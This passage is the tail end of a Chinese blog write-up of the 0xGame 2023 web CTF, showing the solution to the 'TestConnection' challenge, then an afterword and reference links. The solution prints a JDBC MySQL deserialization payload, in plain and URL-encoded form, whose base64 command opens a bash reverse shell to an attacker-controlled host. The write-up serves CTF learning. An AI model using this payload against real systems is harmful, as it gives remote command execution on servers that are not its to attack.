<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">/testConnection?driver=com.mysql.cj.jdbc.Driver&amp;url=jdbc:mysql:<span class="hljs-comment">//vps-ip:3308/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;username=deser_CC31_bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&amp;password=123</span><br></code></pre></td></tr></table></figure>
<p>url 编码</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">/testConnection?driver=com.mysql.cj.jdbc.Driver&amp;url=%6a%64%62%63%3a%6d%79%73%71%6c%3a%2f%2f%31%32%34%2e%32%32%30%2e%32%33%33%2e%32%36%3a%33%33%30%38%2f%74%65%73%74%3f%61%75%74%6f%44%65%73%65%72%69%61%6c%69%7a%65%3d%74%72%75%65%26%71%75%65%72%79%49%6e%74%65%72%63%65%70%74%6f%72%73%3d%63%6f%6d%2e%6d%79%73%71%6c%2e%63%6a%2e%6a%64%62%63%2e%69%6e%74%65%72%63%65%70%74%6f%72%73%2e%53%65%72%76%65%72%53%74%61%74%75%73%44%69%66%66%49%6e%74%65%72%63%65%70%74%6f%72&amp;username=%64%65%73%65%72%5f%43%43%33%31%5f%62%61%73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%6a%51%75%4d%6a%49%77%4c%6a%49%7a%4d%79%34%79%4e%69%38%31%4e%54%55%31%49%44%41%2b%4a%6a%45%3d%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d&amp;password=123<br></code></pre></td></tr></table></figure>
<p>这里尝试了老多次了，我感觉就是需要有一个公网ip来开启mysql服务，如下图，随后bp发包去发送恶意命令进行RCE</p>
<p>![image-20231105164759475](0xGame 2023/image-20231105164759475.png)</p>
<p>如上图，证明发送成功</p>
<p>![image-20231105164923715](0xGame 2023/image-20231105164923715.png)</p>
<p>最后在env中可以看到flag</p>
<p>![image-20231105164747944](0xGame 2023/image-20231105164747944.png)</p>
<h1>0x02 后记</h1>
<p>终于复现完了，虽然感觉做题体验感不好，但出的题真的有水平啊（因为全不会，新生赛就这么高强度？？？？</p>
<p>总的来说，很多知识点都没见过，就这四周的知识点就够我学一阵儿了，同时我依旧困惑于如何去学习提高代码水平，感觉目前的自己就是exp不会，脚本不会，审计代码也很有难度。真的全是bug┭┮﹏┭┮，感觉似乎要认真地重新学学代码了</p>
<h1>0x03 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://exp10it.cn/2023/11/0xgame-2023-web-official-writeup/#testconnection">0xGame 2023 Web Official Writeup</a> --官方wp</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_56426046/article/details/127264705?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=is_numeric%E7%BB%95%E8%BF%87&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-127264705.142%5Ev96%5Epc_search_result_base4&amp;spm=1018.2226.3001.4187">php is_numeric函数的绕过</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/huangyongkang666/article/details/123880442?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169796116116800227493577%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169796116116800227493577&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-123880442-null-null.142%5Ev96%5Epc_search_result_base4&amp;utm_term=is_numeric%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187">常见php函数绕过</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51183537/article/details/121140942?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=is_numeric%E7%BB%95%E8%BF%87&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-6-121140942.142%5Ev96%5Epc_search_result_base4&amp;spm=1018.2226.3001.4187">[CTF]php is_numeric与弱等于(==)绕过</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50854662/article/details/125738844?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=git%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-9-125738844.142%5Ev96%5Epc_search_result_base4&amp;spm=1018.2226.3001.4187">常见的Web源码泄漏漏洞</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/193509.html">Springboot之actuator配置不当的漏洞利用</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/others/234266.html">Spring Boot Actuator 漏洞利用</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9763">Spring Boot Actuator 未授权的测试与利用思路</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/CoLo/p/17051019.html">Java安全之JDBC Attacks</a></p>
<p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html">Java JDBC </a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/10/26/%E6%B5%85%E6%9E%90%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93/">← 下一篇 深度学习文件上传-二次渲染</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/10/16/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/">php无参数RCE 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-1-signin"><span class="toc-number">1.1.</span> <span class="toc-text">[Week 1] signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-1-baby-php"><span class="toc-number">1.2.</span> <span class="toc-text">[Week 1] baby_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-1-hello-http"><span class="toc-number">1.3.</span> <span class="toc-text">[Week 1] hello_http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-1-repo-leak"><span class="toc-number">1.4.</span> <span class="toc-text">[Week 1] repo_leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-1-ping"><span class="toc-number">1.5.</span> <span class="toc-text">[Week 1] ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-2-ez-sqli"><span class="toc-number">1.6.</span> <span class="toc-text">[Week 2] ez_sqli</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-2-ez-upload"><span class="toc-number">1.7.</span> <span class="toc-text">[Week 2] ez_upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-2-ez-unserialize"><span class="toc-number">1.8.</span> <span class="toc-text">[Week 2] ez_unserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-2-ez-sandbox"><span class="toc-number">1.9.</span> <span class="toc-text">[Week 2] ez_sandbox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-3-notebook"><span class="toc-number">1.10.</span> <span class="toc-text">[Week 3] notebook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-3-rss-parser"><span class="toc-number">1.11.</span> <span class="toc-text">[Week 3] rss_parser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-3-zip-file-manager"><span class="toc-number">1.12.</span> <span class="toc-text">[Week 3] zip_file_manager</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">1.12.1.</span> <span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-number">1.12.2.</span> <span class="toc-text">方法二：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-3-web-snapshot"><span class="toc-number">1.13.</span> <span class="toc-text">[Week 3] web_snapshot</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-3-GoShop"><span class="toc-number">1.14.</span> <span class="toc-text">[Week 3] GoShop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-4-spring"><span class="toc-number">1.15.</span> <span class="toc-text">[Week 4] spring</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#env-%E6%B3%84%E9%9C%B2%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">1.15.1.</span> <span class="toc-text">env 泄露配置信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mappings-%E6%B3%84%E9%9C%B2%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF"><span class="toc-number">1.15.2.</span> <span class="toc-text">mappings 泄露路由信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#heapdump-%E6%B3%84%E9%9C%B2%E5%A0%86%E6%A0%88%E4%BF%A1%E6%81%AF"><span class="toc-number">1.15.3.</span> <span class="toc-text">heapdump 泄露堆栈信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-4-auth-bypass"><span class="toc-number">1.16.</span> <span class="toc-text">[Week 4] auth_bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-4-YourBatis"><span class="toc-number">1.17.</span> <span class="toc-text">[Week 4] YourBatis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week-4-TestConnection"><span class="toc-number">1.18.</span> <span class="toc-text">[Week 4] TestConnection</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">0x02 后记</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">0x03 参考文章</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>